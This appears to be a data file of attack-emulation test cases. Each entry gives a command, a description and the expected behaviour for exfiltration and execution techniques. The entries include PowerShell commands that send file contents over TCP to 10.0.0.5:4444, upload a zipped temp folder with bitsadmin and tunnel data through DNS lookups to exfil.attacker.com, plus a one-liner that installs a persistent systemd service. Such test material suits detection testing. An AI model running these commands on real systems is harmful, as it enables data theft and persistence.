attacks.expected_behavior: A hidden file with a non‑printable name (four control characters) is created in the user's home directory, containing compressed and Base64‑encoded random data; the intermediate payload.bin is removed.

attacks.command: powershell -Command "$file = Join-Path $env:TEMP 'secret.txt'; if(!(Test-Path $file)){Set-Content -Path $file -Value 'TestData' -Encoding ASCII}; $data = Get-Content -Path $file -Raw; $client = New-Object System.Net.Sockets.TcpClient('10.0.0.5',4444); $stream = $client.GetStream(); $bytes = [System.Text.Encoding]::ASCII.GetBytes($data); $stream.Write($bytes,0,$bytes.Length); $stream.Close(); $client.Close();"
attacks.description: Reads a small file from %TEMP% and sends its raw content over a TCP connection to a C2 server (10.0.0.5:4444) using PowerShell's .NET TcpClient.
attacks.expected_behavior: The command establishes a TCP socket to the specified IP/port and transmits the file contents, then closes the connection. No files are left behind.

attacks.command: powershell -Command "Compress-Archive -Path `"$env:TEMP\*`" -DestinationPath `"$env:TEMP\data.zip`" -Force; bitsadmin /transfer exfilJob /upload http://10.0.0.5:8080/upload `"$env:TEMP\data.zip`"; Remove-Item -Path `"$env:TEMP\data.zip`" -ErrorAction SilentlyContinue"
attacks.description: Compresses all files in %TEMP% into a zip archive and uploads the archive to a remote HTTP endpoint using bitsadmin, then cleans up the archive.
attacks.expected_behavior: Creates data.zip in %TEMP%, transfers it to the attacker-controlled server via bitsadmin, and finally deletes the local zip file. The upload occurs over the existing HTTP C2 channel.

attacks.command: powershell -Command "$file = Join-Path $env:TEMP 'secret.txt'; if(!(Test-Path $file)){Set-Content -Path $file -Value 'SensitiveInfo' -Encoding ASCII}; $b64 = Join-Path $env:TEMP 'secret.b64'; certutil -encode -f $file $b64 > $null; Get-Content -Path $b64 | ForEach-Object { $label = $_.Trim(); if($label -ne ''){nslookup `"$label.exfil.attacker.com`" > $null} }; Remove-Item -Path $b64 -ErrorAction SilentlyContinue"
attacks.description: Encodes a file to Base64 with certutil, then exfiltrates each line via DNS queries (nslookup) to a controlled domain, mimicking DNS tunneling.
attacks.expected_behavior: The file is base64‑encoded, each line is sent as a DNS lookup to exfil.attacker.com, and the temporary encoded file is removed. No persistent artifacts remain.

attacks.description: Basic exfiltration: Sends the contents of /tmp/secret.txt to a remote HTTP server using curl, representing a simple C2 channel over HTTP.
attacks.expected_behavior: The file is uploaded via an HTTP POST request; the remote server receives the data in the 'data' form field.

attacks.description: Intermediate exfiltration: Encodes the file with base64 and streams it over a raw TCP connection to a listener on the attacker’s host using netcat.
attacks.expected_behavior: The base64‑encoded contents of the file are transmitted to example.com on port 4444; a netcat listener on that port would receive the data.

attacks.description: Advanced exfiltration: Establishes a reverse SSH tunnel from the compromised host to the attacker, then uses scp over the tunneled port to pull the secret file back to the attacker’s machine.
attacks.expected_behavior: An SSH reverse tunnel is created listening on the attacker’s port 2222; the subsequent scp command uses that tunnel to copy /tmp/secret.txt to the attacker’s /tmp/secret_exfil.txt.

attacks.description: Downloads a benign executable from a URL and executes it
attacks.expected_behavior: The benign executable will be downloaded and executed

attacks.description: Executes a PowerShell script from the temp directory
attacks.expected_behavior: The PowerShell script will be executed

attacks.description: Creates an HTML file with a benign script and opens it in the default browser
attacks.expected_behavior: The HTML file will be created and opened in the default browser

attacks.description: Basic user execution: creates a harmless script in a user-writable directory and runs it directly.
attacks.expected_behavior: The script prints 'Malicious script executed' to standard output.

attacks.description: Intermediate execution: copies a legitimate binary to a new name in /tmp, makes it executable, and runs it, mimicking a malicious file disguised as a trusted executable.
attacks.expected_behavior: Lists the contents of the current directory and then prints 'Malicious binary executed'.

attacks.command:
echo -e '[Unit]
Description=Malicious Service
[Service]
ExecStart=/usr/local/bin/malicious.sh
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/malicious.service && echo -e '#!/bin/bash
echo "Malicious service started" >> /var/log/malicious.log' > /usr/local/bin/malicious.sh && chmod +x /usr/local/bin/malicious.sh && systemctl daemon-reload && systemctl enable malicious.service && systemctl start malicious.service
attacks.description: Advanced execution: installs a systemd service that runs a malicious script at boot, demonstrating persistence via user‑executed service files.
attacks.expected_behavior: The service starts, appends 'Malicious service started' to /var/log/malicious.log, and appears as active in systemctl status.
